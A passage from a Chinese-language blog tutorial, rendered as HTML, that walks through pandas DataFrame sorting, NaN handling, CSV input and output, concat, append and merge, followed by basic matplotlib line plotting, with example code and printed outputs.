class="line"></div><div class="line">datas.columns</div><div class="line"><span class="comment"># Index([u'A', u'B', u'C', u'D', u'E', u'F'], dtype='object')</span></div><div class="line"></div><div class="line">datas.values</div><div class="line"><span class="comment"># array(</span></div><div class="line"><span class="comment"># [</span></div><div class="line"><span class="comment">#   [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'test', 'foo'],</span></div><div class="line"><span class="comment">#   [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'train', 'foo'],</span></div><div class="line"><span class="comment">#   [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'test', 'foo'],</span></div><div class="line"><span class="comment">#   [1.0, Timestamp('2017-11-08 00:00:00'), 1.0, 3, 'train', 'foo']</span></div><div class="line"><span class="comment"># ],</span></div><div class="line"><span class="comment"># dtype=object)</span></div></pre></td></tr></table></figure><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">datas.sort_index(axis=<span class="number">0</span>, ascending=<span class="keyword">False</span>)</div><div class="line"><span class="comment">#      F      E  D    C          B    A</span></div><div class="line"><span class="comment"># 0  foo   test  3  1.0 2017-11-08  1.0</span></div><div class="line"><span class="comment"># 1  foo  train  3  1.0 2017-11-08  1.0</span></div><div class="line"><span class="comment"># 2  foo   test  3  1.0 2017-11-08  1.0</span></div><div class="line"><span class="comment"># 3  foo  train  3  1.0 2017-11-08  1.0</span></div><div class="line"></div><div class="line">datas.sort_index(axis=<span class="number">0</span>, ascending=<span class="keyword">False</span>)</div><div class="line"><span class="comment">#      A          B    C  D      E    F</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"></div><div class="line">datas.sort_values(by=<span class="string">'E'</span>)</div><div class="line"><span class="comment">#      A          B    C  D      E    F</span></div><div class="line"><span class="comment"># 0  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 2  1.0 2017-11-08  1.0  3   test  foo</span></div><div class="line"><span class="comment"># 1  1.0 2017-11-08  1.0  3  train  foo</span></div><div class="line"><span class="comment"># 3  1.0 2017-11-08  1.0  3  train  foo</span></div></pre></td></tr></table></figure><h4 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">datas = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'A'</span>: pd.Series([<span class="number">1</span>, <span class="number">5</span>, <span class="string">'test'</span>, <span class="string">'foo'</span>], index=list(range(<span class="number">4</span>))),</div><div class="line">  <span class="string">'B'</span>: pd.Series([np.nan, <span class="number">1</span>, np.nan, <span class="string">'test'</span>], index=list(range(<span class="number">4</span>))),</div><div class="line">  <span class="string">'C'</span>: pd.Series(<span class="number">1</span>, index=list(range(<span class="number">4</span>)), dtype=<span class="string">'float32'</span>),</div><div class="line">&#125;)</div><div class="line"><span class="comment">#       A     B    C</span></div><div class="line"><span class="comment"># 0     1   NaN  1.0</span></div><div class="line"><span class="comment"># 1     5     1  1.0</span></div><div class="line"><span class="comment"># 2  test   NaN  1.0</span></div><div class="line"><span class="comment"># 3   foo  test  1.0</span></div><div class="line"></div><div class="line">datas.dropna(axis=<span class="number">0</span>, how=<span class="string">'any'</span>)</div><div class="line"><span class="comment"># 当axis是1时，则判断竖向里是否含有NaN的值</span></div><div class="line"><span class="comment"># how = 'any' || 'all' 默认是any</span></div><div class="line"><span class="comment"># 当是any的时候, 有一个值是NaN的时, 就删除这一行。</span></div><div class="line"><span class="comment"># 当时all的时候, 这一行全部为NaN时, 就删除这一行</span></div><div class="line"><span class="comment">#      A     B    C</span></div><div class="line"><span class="comment"># 1    5     1  1.0</span></div><div class="line"><span class="comment"># 3  foo  test  1.0</span></div><div class="line"></div><div class="line">datas.fillna(value=<span class="number">0</span>)</div><div class="line"><span class="comment">#       A     B    C</span></div><div class="line"><span class="comment"># 0     1     0  1.0</span></div><div class="line"><span class="comment"># 1     5     1  1.0</span></div><div class="line"><span class="comment"># 2  test     0  1.0</span></div><div class="line"><span class="comment"># 3   foo  test  1.0</span></div><div class="line"></div><div class="line">datas.isnull()</div><div class="line"><span class="comment">#        A      B      C</span></div><div class="line"><span class="comment"># 0  False   True  False</span></div><div class="line"><span class="comment"># 1  False  False  False</span></div><div class="line"><span class="comment"># 2  False   True  False</span></div><div class="line"><span class="comment"># 3  False  False  False</span></div><div class="line"></div><div class="line"><span class="comment"># 当数据特别大的时候, 或者只想判断是否有值是NaN的值时</span></div><div class="line"><span class="comment"># np.any(datas.isnull()) == True</span></div><div class="line"><span class="comment">#   当有值时NaN时, 将返回True</span></div></pre></td></tr></table></figure><h4 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">pd.read_csv(<span class="string">'***.csv'</span>,delimiter=<span class="string">','</span>,encoding=<span class="string">'utf-8'</span>,names=[<span class="string">'test1'</span>,<span class="string">'test2'</span>,<span class="string">'test3'</span>])</div><div class="line"><span class="comment"># 参数一：读取的目标文件</span></div><div class="line"><span class="comment"># 参数二：csv文件的分隔符</span></div><div class="line"><span class="comment"># 参数三：编码</span></div><div class="line"><span class="comment"># 参数四：设置列名</span></div><div class="line"></div><div class="line"><span class="comment">#           test1     test2          test3</span></div><div class="line"><span class="comment"># 0    2017-11-18       ABC        51315.0</span></div><div class="line"><span class="comment"># 1    2017-11-19       DEF         5659.0</span></div><div class="line"><span class="comment"># 2    2017-11-20       GHI         1599.0</span></div><div class="line"><span class="comment"># 3    2017-11-21       JKL         2224.0</span></div><div class="line"></div><div class="line">datas.to_csv(<span class="string">'**.csv'</span>)</div></pre></td></tr></table></figure><p><img src="http://on7r0tqgu.bkt.clouddn.com/FhRJurrbSU5aEHqc8YCqGbe_4Jgt.png" alt=""></p><h4 id="合并-1"><a href="#合并-1" class="headerlink" title="合并"></a>合并</h4><h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">datas1 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">0</span>, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></div><div class="line"></div><div class="line">datas2 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">1</span>, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 1  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 2  1.0  1.0  1.0  1.0</span></div><div class="line"></div><div class="line">datas3 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">2</span>, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 1  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 2  2.0  2.0  2.0  2.0</span></div><div class="line"></div><div class="line">pd.concat([datas1, datas2, datas3], axis=<span class="number">0</span>, ignore_index=<span class="keyword">True</span>)</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 3  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 5  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 6  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 7  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 8  2.0  2.0  2.0  2.0</span></div><div class="line"></div><div class="line">pd.concat([datas1, datas2, datas3], axis=<span class="number">1</span>)</div><div class="line"><span class="comment">#      a    b    c    d    a    b    c    d    a    b    c    d</span></div><div class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0  2.0  2.0  2.0  2.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0  2.0  2.0  2.0  2.0</span></div></pre></td></tr></table></figure><h6 id="concat-部分参数"><a href="#concat-部分参数" class="headerlink" title="concat 部分参数"></a>concat 部分参数</h6><blockquote><p>在concat里, join的默认参数时outer</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">datas1 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">0</span>, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>], index=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 3  0.0  0.0  0.0  0.0</span></div><div class="line"></div><div class="line">datas2 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">1</span>, columns=[<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>], index=[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="comment">#      b    c    d    e</span></div><div class="line"><span class="comment"># 2  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 3  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  1.0  1.0  1.0  1.0</span></div><div class="line"></div><div class="line">pd.concat([datas1, datas2], join=<span class="string">'outer'</span>)</div><div class="line"><span class="comment">#      a    b    c    d    e</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0  NaN</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0  NaN</span></div><div class="line"><span class="comment"># 3  0.0  0.0  0.0  0.0  NaN</span></div><div class="line"><span class="comment"># 2  NaN  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 3  NaN  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  NaN  1.0  1.0  1.0  1.0</span></div><div class="line"></div><div class="line">pd.concat([datas1, datas2], join=<span class="string">'inner'</span>)</div><div class="line"><span class="comment">#      b    c    d</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 3  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 3  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  1.0  1.0  1.0</span></div><div class="line"></div><div class="line">pd.concat([datas1, datas2], axis=<span class="number">1</span>, join_axes=[datas2.index])</div><div class="line"><span class="comment">#      a    b    c    d    b    c    d    e</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 3  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  NaN  NaN  NaN  NaN  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 如果没有join_axes值时:</span></div><div class="line"><span class="comment">#      a    b    c    d    b    c    d    e</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0  NaN  NaN  NaN  NaN</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 3  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0</span></div><div class="line"><span class="comment"># 4  NaN  NaN  NaN  NaN  1.0  1.0  1.0  1.0</span></div></pre></td></tr></table></figure><h5 id="append"><a href="#append" class="headerlink" title="append"></a>append</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">datas1 = pd.DataFrame(np.ones((<span class="number">3</span>, <span class="number">4</span>)) * <span class="number">0</span>, columns=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></div><div class="line"></div><div class="line">datas2 = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], index=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"></div><div class="line">datas1.append(datas2, ignore_index=<span class="keyword">True</span>)</div><div class="line"><span class="comment">#      a    b    c    d</span></div><div class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></div><div class="line"><span class="comment"># 3  1.0  2.0  3.0  4.0</span></div></pre></td></tr></table></figure><h5 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">left = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'key'</span>: [<span class="string">'k0'</span>, <span class="string">'k1'</span>, <span class="string">'k2'</span>, <span class="string">'k3'</span>],</div><div class="line">  <span class="string">'A'</span>: [<span class="string">'A0'</span>, <span class="string">'A1'</span>, <span class="string">'A2'</span>, <span class="string">'A3'</span>],</div><div class="line">  <span class="string">'B'</span>: [<span class="string">'B0'</span>, <span class="string">'B1'</span>, <span class="string">'B2'</span>, <span class="string">'B3'</span>]</div><div class="line">&#125;)</div><div class="line"><span class="comment">#     A   B key</span></div><div class="line"><span class="comment"># 0  A0  B0  k0</span></div><div class="line"><span class="comment"># 1  A1  B1  k1</span></div><div class="line"><span class="comment"># 2  A2  B2  k2</span></div><div class="line"><span class="comment"># 3  A3  B3  k3</span></div><div class="line"></div><div class="line">right = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'key'</span>: [<span class="string">'k0'</span>, <span class="string">'k1'</span>, <span class="string">'k2'</span>, <span class="string">'k3'</span>],</div><div class="line">  <span class="string">'C'</span>: [<span class="string">'C0'</span>, <span class="string">'C1'</span>, <span class="string">'C2'</span>, <span class="string">'C3'</span>],</div><div class="line">  <span class="string">'D'</span>: [<span class="string">'D0'</span>, <span class="string">'D1'</span>, <span class="string">'D2'</span>, <span class="string">'D3'</span>]</div><div class="line">&#125;)</div><div class="line"><span class="comment">#     C   D key</span></div><div class="line"><span class="comment"># 0  C0  D0  k0</span></div><div class="line"><span class="comment"># 1  C1  D1  k1</span></div><div class="line"><span class="comment"># 2  C2  D2  k2</span></div><div class="line"><span class="comment"># 3  C3  D3  k3</span></div><div class="line"></div><div class="line">pd.merge(left, right, on=<span class="string">'key'</span>)</div><div class="line"><span class="comment">#     A   B key   C   D</span></div><div class="line"><span class="comment"># 0  A0  B0  k0  C0  D0</span></div><div class="line"><span class="comment"># 1  A1  B1  k1  C1  D1</span></div><div class="line"><span class="comment"># 2  A2  B2  k2  C2  D2</span></div><div class="line"><span class="comment"># 3  A3  B3  k3  C3  D3</span></div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">left = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'key1'</span>: [<span class="string">'k0'</span>, <span class="string">'k0'</span>, <span class="string">'k1'</span>, <span class="string">'k2'</span>],</div><div class="line">  <span class="string">'key2'</span>: [<span class="string">'k0'</span>, <span class="string">'k1'</span>, <span class="string">'k0'</span>, <span class="string">'k1'</span>],</div><div class="line">  <span class="string">'A'</span>: [<span class="string">'A0'</span>, <span class="string">'A1'</span>, <span class="string">'A2'</span>, <span class="string">'A3'</span>],</div><div class="line">  <span class="string">'B'</span>: [<span class="string">'B0'</span>, <span class="string">'B1'</span>, <span class="string">'B2'</span>, <span class="string">'B3'</span>]</div><div class="line">&#125;)</div><div class="line"><span class="comment">#     A   B key1 key2</span></div><div class="line"><span class="comment"># 0  A0  B0   k0   k0</span></div><div class="line"><span class="comment"># 1  A1  B1   k0   k1</span></div><div class="line"><span class="comment"># 2  A2  B2   k1   k0</span></div><div class="line"><span class="comment"># 3  A3  B3   k2   k1</span></div><div class="line"></div><div class="line">right = pd.DataFrame(&#123;</div><div class="line">  <span class="string">'key1'</span>: [<span class="string">'k0'</span>, <span class="string">'k1'</span>, <span class="string">'k1'</span>, <span class="string">'k2'</span>],</div><div class="line">  <span class="string">'key2'</span>: [<span class="string">'k0'</span>, <span class="string">'k0'</span>, <span class="string">'k0'</span>, <span class="string">'k0'</span>],</div><div class="line">  <span class="string">'C'</span>: [<span class="string">'C0'</span>, <span class="string">'C1'</span>, <span class="string">'C2'</span>, <span class="string">'C3'</span>],</div><div class="line">  <span class="string">'D'</span>: [<span class="string">'D0'</span>, <span class="string">'D1'</span>, <span class="string">'D2'</span>, <span class="string">'D3'</span>]</div><div class="line">&#125;)</div><div class="line"><span class="comment">#     C   D key1 key2</span></div><div class="line"><span class="comment"># 0  C0  D0   k0   k0</span></div><div class="line"><span class="comment"># 1  C1  D1   k1   k0</span></div><div class="line"><span class="comment"># 2  C2  D2   k1   k0</span></div><div class="line"><span class="comment"># 3  C3  D3   k2   k0</span></div><div class="line"></div><div class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'inner'</span>)</div><div class="line"><span class="comment"># how默认是inner</span></div><div class="line"><span class="comment">#     A   B key1 key2   C   D</span></div><div class="line"><span class="comment"># 0  A0  B0   k0   k0  C0  D0</span></div><div class="line"><span class="comment"># 1  A2  B2   k1   k0  C1  D1</span></div><div class="line"><span class="comment"># 2  A2  B2   k1   k0  C2  D2</span></div><div class="line"></div><div class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'outer'</span>)</div><div class="line"><span class="comment">#      A    B key1 key2    C    D</span></div><div class="line"><span class="comment"># 0   A0   B0   k0   k0   C0   D0</span></div><div class="line"><span class="comment"># 1   A1   B1   k0   k1  NaN  NaN</span></div><div class="line"><span class="comment"># 2   A2   B2   k1   k0   C1   D1</span></div><div class="line"><span class="comment"># 3   A2   B2   k1   k0   C2   D2</span></div><div class="line"><span class="comment"># 4   A3   B3   k2   k1  NaN  NaN</span></div><div class="line"><span class="comment"># 5  NaN  NaN   k2   k0   C3   D3</span></div><div class="line"></div><div class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>]. how=<span class="string">'right'</span>)</div><div class="line"><span class="comment">#      A    B key1 key2   C   D </span></div><div class="line"><span class="comment"># 0   A0   B0   k0   k0  C0  D0 </span></div><div class="line"><span class="comment"># 1   A2   B2   k1   k0  C1  D1 </span></div><div class="line"><span class="comment"># 2   A2   B2   k1   k0  C2  D2 </span></div><div class="line"><span class="comment"># 3  NaN  NaN   k2   k0  C3  D3</span></div><div class="line"></div><div class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'left'</span>)</div><div class="line"><span class="comment">#     A   B key1 key2    C    D</span></div><div class="line"><span class="comment"># 0  A0  B0   k0   k0   C0   D0</span></div><div class="line"><span class="comment"># 1  A1  B1   k0   k1  NaN  NaN</span></div><div class="line"><span class="comment"># 2  A2  B2   k1   k0   C1   D1</span></div><div class="line"><span class="comment"># 3  A2  B2   k1   k0   C2   D2</span></div><div class="line"><span class="comment"># 4  A3  B3   k2   k1  NaN  NaN</span></div></pre></td></tr></table></figure><hr><h2 id="matplotilb"><a href="#matplotilb" class="headerlink" title="matplotilb"></a>matplotilb</h2><h3 id="导入-2"><a href="#导入-2" class="headerlink" title="导入"></a>导入</h3><p><code>import matplotlib.pyplot as plt</code></p><h3 id="API-2"><a href="#API-2" class="headerlink" title="API"></a>API</h3><h4 id="plot"><a href="#plot" class="headerlink" title="plot"></a>plot</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">data = pd.Series(np.random.randn(<span class="number">1000</span>)) <span class="comment"># 随机1000个数</span></div><div class="line">data = data.cumsum() <span class="comment"># 累加</span></div><div class="line"><span class="comment"># 因为pandas本来就是一个数据，所以可以直接plot,</span></div><div class="line"><span class="comment"># 还有两种写法: plt.plot(x= , y = ) 或者 plt.plot([xxx, xxx], [yyy, yyy])</span></div><div class="line">data.plot()</div><div class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment"># 用来正常显示中文标签</span></div><div class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment"># 用来正常显示负号</span></div><div class="line"><span class="comment"># linewidth线条的宽度</span></div><div class="line"><span class="comment"># linestyle线条风格(-实线 --破折线 -.点划线 :虚线 None说明都不画)</span></div><div class="line">plt.plot([<span class="number">1</span>,<span class="number">50</span>,<span class="number">100</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>], linewidth=<span class="number">2.5</span>, linestyle=<span class="string">'--'</span>, label=<span class="string">'lalala'</span>)</div><div class="line">plt.legend(loc=<span class="string">'upper left'</span>) <span class="comment"># 没有这句, 上面的label将不会显示</span></div><div class="line">plt.plot([<span class="number">1</span>,<span class="number">100</span>,<span class="number">200</span>],[<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>]) <span class="comment"># 第三个数据</span></div><div class="line">plt.title(<span class="string">'Demo'</span>) <span class="comment"># 标题</span></div><div class="line">plt.xlabel(<span class="string">'xxx'</span>) <span class="comment"># x轴名称</span></div><div class="line">plt.ylabel(<span class="string">'yyy'</span>) <span class="comment"># y轴名称</span></div><div class="line">plt.text(<span class="number">60</span>, <span class="number">10</span>, <span class="string">u'说明文字'</span>) <span class="comment"># 说明文字</span></div><div class="line">plt.show()  <span class="comment"># 显示</span></div></pre></td></tr></table></figure><p><img src="http://on7r0tqgu.bkt.clouddn.com/FsJ_DYXc73SJRqiiuuDJfW_prGB7.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#  随机1000行4列的数字, 行数从0到999, 列表为A B C D</span></div><div class="line">data = pd.DataFrame(np.random.randn(<span class="number">1000</span>, <span class="number">4</span>),</div><div class="line">          index=np.arange(<span class="number">1000</span>),</div><div class="line">          columns=list(<span class="string">'ABCD'</span>))</div><div class="line">data = data.cumsum()  <span class="comment"># 累加</span></div><div class="line">data.plot()</div><div class="line">plt.show()</div></pre></td></tr></table></figure><p><img src="http://on7r0tqgu.bkt.clouddn.com/Fp-jimPylCiXfqYpO4pw8ZDal_14.png" alt=""></p><h4 id="其他图"><a href="#其他图" class="headerlink" title="其他图"></a>其他图</h4><h5 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plt.bar(left, height, width=<span class="number">0.8</span>)</div></pre></td></tr></table></figure><h5 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div 